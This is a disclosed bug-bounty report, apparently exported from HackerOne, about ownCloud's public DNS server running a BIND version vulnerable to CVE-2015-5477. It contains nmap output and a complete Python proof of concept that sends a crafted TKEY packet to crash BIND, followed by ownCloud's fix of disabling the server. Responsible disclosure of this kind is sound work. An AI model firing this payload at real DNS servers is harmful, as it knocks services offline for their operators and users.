{"id":89097,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84OTA5Nw==","url":"https://hackerone.com/reports/89097","title":"owncloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-09-15T20:11:07.363Z","submitted_at":"2015-09-15T20:11:07.363Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"1n3","url":"/1n3","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3059,"url":"https://hackerone.com/owncloud","handle":"owncloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"ownCloud","twitter_handle":"ownCloud","website":"https://www.owncloud.com","about":"ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2015-5477"],"singular_disclosure_disabled":false,"disclosed_at":"2015-09-16T08:25:57.909Z","bug_reporter_agreed_on_going_public_at":"2015-09-16T08:25:56.515Z","team_member_agreed_on_going_public_at":"2015-09-16T08:00:09.422Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"owncloud.com appears to be vulnerable to CVE-2015-5477 based on the running version of BIND. This allows attackers to launch Denial of Service attacks against owncloud.com which would result in the owncloud server to stop responding and even reboot. It is recommended to upgrade to the latest version of ISC Bind. \r\n\r\nNMap Scan Results:\r\nStarting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-15 14:37 EDT\r\nWarning: 50.30.33.235 giving up on port because retransmission cap hit (6).\r\nNmap scan report for owncloud.com (50.30.33.235)\r\nHost is up (0.041s latency).\r\nrDNS record for 50.30.33.235: www.owncloud.com\r\nNot shown: 993 closed ports, 3 filtered ports\r\nPORT    STATE SERVICE  VERSION\r\n22/tcp  open  ssh      OpenSSH 5.8 (protocol 2.0)\r\n| ssh-hostkey: \r\n|   1024 96:ad:80:e0:cb:33:02:47:67:6b:1c:f1:29:7e:e7:c6 (DSA)\r\n|   1024 68:ee:34:57:52:e5:fe:7b:7b:32:86:d9:99:57:08:73 (RSA)\r\n|_  256 fb:b8:b5:5b:7a:b2:46:61:f2:87:e7:2b:0d:c7:bc:2d (ECDSA)\r\n53/tcp  open  domain\r\n| dns-nsid: \r\n|_  bind.version: 9.9.4-rpz2.13269.14-P2\r\n\r\n\r\nExploit PoC:\r\n# Exploit Title: PoC for BIND9 TKEY DoS\r\n# Exploit Author: elceef\r\n# Software Link: https://github.com/elceef/tkeypoc/\r\n# Version: ISC BIND 9\r\n# Tested on: multiple\r\n# CVE : CVE-2015-5477\r\n \r\n#!/usr/bin/env python\r\n \r\nimport socket\r\nimport sys\r\n \r\nprint('CVE-2015-5477 BIND9 TKEY PoC')\r\n \r\nif len(sys.argv) \u003c 2:\r\n    print('Usage: ' + sys.argv[0] + ' [target]')\r\n    sys.exit(1)\r\n \r\nprint('Sending packet to ' + sys.argv[1] + ' ...')\r\n \r\npayload = bytearray('4d 55 01 00 00 01 00 00 00 00 00 01 03 41 41 41 03 41 41 41 00 00 f9 00 ff 03 41 41 41 03 41 41 41 00 00 0a 00 ff 00 00 00 00 00 09 08 41 41 41 41 41 41 41 41'.replace(' ', '').decode('hex')) \r\n \r\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\r\nsock.sendto(payload, (sys.argv[1], 53))\r\n \r\nprint('Done.')\r\n\r\n\r\nCVE Details:\r\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5477","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-10-16T08:00:09.665Z","allow_singular_disclosure_after":-188984317.38286144,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":589178,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us. We take security very seriously and would appreciate if you would not share any information about this bug until we have determined a potential patch.\r\n \r\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster.","automated_response":true,"created_at":"2015-09-15T20:11:07.691Z","updated_at":"2015-09-15T20:11:07.691Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":589210,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks. I will escalate this to the responsible team to verify the security implications.\n\nHowever, please note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure. – We will however acknowledge this and mark this as valid bug.\n\nFrom our FAQ:\n\u003e **Q: Why do you exclude the ownCloud websites and infrastructure?**\n\u003e A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.\n\nIf you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/","automated_response":false,"created_at":"2015-09-15T20:17:55.712Z","updated_at":"2015-09-15T20:17:55.712Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":589630,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for reporting this issue back to us. We have meanwhile disabled the DNS server running on \"owncloud.com\" since it is not required for public service.\n\n```\n➜  ~  telnet owncloud.com 53\nTrying 50.30.33.235...\ntelnet: connect to address 50.30.33.235: Connection refused\ntelnet: Unable to connect to remote host\n```","automated_response":false,"created_at":"2015-09-16T07:59:54.967Z","updated_at":"2015-09-16T07:59:54.967Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"1n3","url":"/1n3"},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":589631,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-09-16T08:00:09.466Z","updated_at":"2015-09-16T08:00:09.466Z","first_to_agree":true,"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":589632,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2015-09-16T08:00:14.773Z","updated_at":"2015-09-16T08:00:14.773Z","additional_data":{"old_title":"CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)","new_title":"owncloud.com: CVE-2015-5477 BIND9 TKEY Vulnerability + Exploit (Denial of Service)"},"actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":589639,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2015-09-16T08:25:56.574Z","updated_at":"2015-09-16T08:25:56.574Z","actor":{"username":"1n3","cleared":true,"url":"/1n3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":589640,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2015-09-16T08:25:57.937Z","updated_at":"2015-09-16T08:25:57.937Z","actor":{"username":"1n3","cleared":true,"url":"/1n3","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9BcGMu3V68aXLSPHzP7UQk9k/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":656499,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Thanks a lot for your report. Please note that for the time being we do not award monetary rewards for bugs reported for our own website and infrastructure.\n\nFrom our FAQ:\n\u003e **Q: Why do you exclude the ownCloud websites and infrastructure?**\n\u003e A: For the time being we want to focus our efforts on ownCloud Server instead of vulnerabilities within our website and infrastructure. However, if you find a security bug in our website or infrastructure we welcome any report, though we cannot offer a monetary incentive.\n\nIf you want to ensure that your submission are in-scope you might want to try the code available from https://owncloud.org/install/","automated_response":false,"created_at":"2015-11-13T11:27:29.220Z","updated_at":"2015-11-13T11:27:29.220Z","actor":{"url":"/owncloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"ownCloud"}},"genius_execution_id":null,"team_handle":"owncloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}